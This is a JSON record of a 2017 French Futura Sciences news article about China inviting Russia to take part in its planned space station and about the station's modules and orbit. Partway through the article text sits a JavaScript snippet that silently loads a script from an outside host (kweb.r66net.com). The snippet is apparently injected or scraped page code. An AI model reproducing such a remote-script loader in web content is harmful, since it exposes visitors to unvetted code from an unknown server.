{"title": "Station spatiale chinoise : la Russie est invitee a y participer", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-06-29", "content": "La Chine, qui prevoit de debuter la construction de sa station spatiale des 2019, invite la Russie a la rejoindre dans ce projet. Une proposition a laquelle Moscou n'a pas encore repondu. Mais, dans un contexte de deterioration des relations avec ses partenaires occidentaux et des difficultes a financer son programme spatial, cette demande est evidemment tres tentante. Lors du Salon du Bourget, le responsable de Roscosomos a confirme avoir recu une invitation a participer au programme de la station spatiale chinoise dont la construction doit debuter en 2019. Cette proposition a laquelle Moscou n'a pas encore repondu s'est faite dans un contexte tres defavorable a la Russie, entre difficultes budgetaires et deterioration des relations avec ses partenaires occidentaux. Cela dit, en depit des sanctions occidentales qui frappent le pays du fait de la crise russo-ukrainienne, la cooperation spatiale entre les partenaires du programme de la Station spatiale est bonne.  Cette invitation arrive aussi a un moment ou la Russie doit prendre des decisions, d'une part concernant l'avenir de la  Station spatiale internationale  (ISS) - les partenaires prevoient de l'utiliser jusqu'en 2024, voire 2028 - et, d'autre part, la construction d'une  station spatiale russe  en reutilisant certains, si ce n'est pas tous, modules du segment russe du complexe orbital. Pour financer cette future infrastructure spatiale prevue en 2025, la Russie a d'ailleurs propose aux Brics (groupe de cinq pays comprenant le Bresil, la Russie, l'Inde, la Chine et l'Afrique du Sud) d'y participer techniquement et financierement.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La Russie reste dans l'expectative Cette idee chinoise, aussi attrayante soit-elle, plonge les Russes dans l'expectative. C'est faire un choix qui les engagera pour au moins vingt ans et remettra a plat des pans entiers de leur programme spatial des vols habites et de l'exploration. Cela dit, cette participation a une station spatiale chinoise se heurte a un reel point de blocage. En effet, les Chinois ont prevu d'installer leur station sur une  orbite  dont le plan est incline de 42,8deg par rapport au plan de l'equateur. C'est une inclinaison tres differente de celle de la  Station spatiale internationale  (51,6deg par rapport au plan de l'equateur), qui la rendra difficile d'acces depuis les cosmodromes russes pour les vehicules Soyouz de transport d'equipage et de fret. Pour en savoir plus  Decouvrez la future station spatiale chinoise Article de Remy Decourt publie le 13/08/2016 En 2018, la Chine lancera la partie centrale de sa station spatiale. Deux autres modules suivront ensuite, puis un  telescope  spatial, non arrime, viendra completer l'ensemble. Le sas de cette station (sa  porte , donc) sera ouvert a de nombreux pays qui n'ont pas les moyens d'un acces a l'espace. L'Agence chinoise chargee des vols habites (CMSA) a fourni de nombreux nouveaux details de son projet de  Station spatiale , nommee Tian Gong, et dont la mise en service est toujours prevue au tout debut des annees 2020. Le premier element de cette station, le module central Tian He, devrait etre lance en 2018. Cette station spatiale sera composee de  trois modules . Le module d'experiences I, baptise Wen Tian, sera le premier laboratoire a venir s'arrimer sur le module central Tian He, quand celui-ci aaura ete inspecte et valide par un sejour de  taikonautes  avec un vaisseau  Shenzhou . Wen Tian sera equipe d'un bras telemanipulateur et d'un sas de sortie extravehiculaire. Un telescope spatial naviguera de concert Le module d'experimentation II, appele Meng Tian, constituera un laboratoire polyvalent, sur lequel le ravitailleur automatique Tianzhou viendra s'arrimer apres avoir ete satellise par le  lanceur  CZ-7 depuis Wenchang.  Grande particularite, un telescope spatial volera a quelques encablures de la Station sur la meme orbite afin de faciliter les operations de  maintenance . Son  miroir  de deux metres de diametre sera legerement plus petit que celui du  telescope spatial Hubble  (2,4 m) mais son champ de vision sera bien plus grand. Comme Hubble lors de sa mise en service, les concepteurs de XunTian (c'est son nom) promettent de grandes avancees scientifiques. Les trois modules de la station spatiale chinoise. De haut en bas, le module central Tian He, le module d'experiences I Wen Tian et le module d'experimentation II Meng Tian. (c) CMSA                               Priorite a la science L'ensemble volera autour de la  Terre  entre 340 et 450 kilometres, a peu pres a la meme altitude que la  Station spatiale internationale . Son inclinaison sera en revanche differente. L'ISS est inclinee de 51,6deg par rapport a l'equateur (pour lui permettre de survoler le territoire russe et d'etre en contact quotidien avec le centre de controle situe a Korolev). L'inclinaison de la station spatiale chinoise sera quant a elle de 42 ou 43deg. Elle survolera donc des  latitude  plus basses. D'une  duree  de vie d'au moins dix ans, elle est prevue pour fonctionner jusqu'au milieu de la decennie 2030. Tian Gong sera surtout utilisee pour faire de la recherche dans le domaine de la medecine, des sciences spatiales et des nouvelles technologies. En fonction des besoins, d'autres modules viendront la completer pour l'agrandir. Elle sera occupee en permanence par un equipage de trois taikonautes et pourra accueillir six personnes lors des rotations des equipages, prevues tous les six mois mais des missions de 5 a 10 jours sont egalement prevues. Elle sera desservie par les vehicules habites Shenzhou et de ravitaillement Tianzhou, en cours de developpement. Une fascinante bulle d'eau coloree et effervescente a bord de l'ISS                       A bord de l'ISS, les astronautes font de nombreuses experiences, notamment pour comprendre le comportement des fluides en impesanteur. Dans cette video, ils dissolvent un comprime effervescent dans de l'eau flottant en microgravite.                                       ", "theme": "sciences"}